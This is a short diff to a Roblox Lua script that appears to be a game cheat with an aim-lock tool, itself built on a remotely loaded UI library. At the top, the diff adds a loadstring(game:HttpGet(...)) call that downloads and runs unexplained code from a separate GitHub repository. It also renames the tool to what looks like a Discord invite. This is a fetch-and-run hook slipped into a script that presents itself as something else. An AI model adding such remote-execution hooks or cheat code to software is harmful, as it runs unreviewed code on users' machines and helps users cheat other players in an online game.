@@ -1,3 +1,7 @@
+https://raw.githubusercontent.com/raatical/raatical/main/ali
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/raatical/raatical/main/ali"))()
+
 local library = loadstring(game:HttpGet('https://raw.githubusercontent.com/obeseinsect/roblox/main/Ui%20Libraries/Elerium.lua'))()
 
 -- Lock
@@ -263,7 +267,7 @@ function calculateVelocity(initialPos, finalPos, timeInterval)
     end)
  local Tool = Instance.new("Tool")
 Tool.RequiresHandle = false
-Tool.Name = "Lock Tool"
+Tool.Name = ".gg/s15x"
 Tool.Parent = game.Players.LocalPlayer.Backpack
 local player = game.Players.LocalPlayer
 local function connectCharacterAdded()
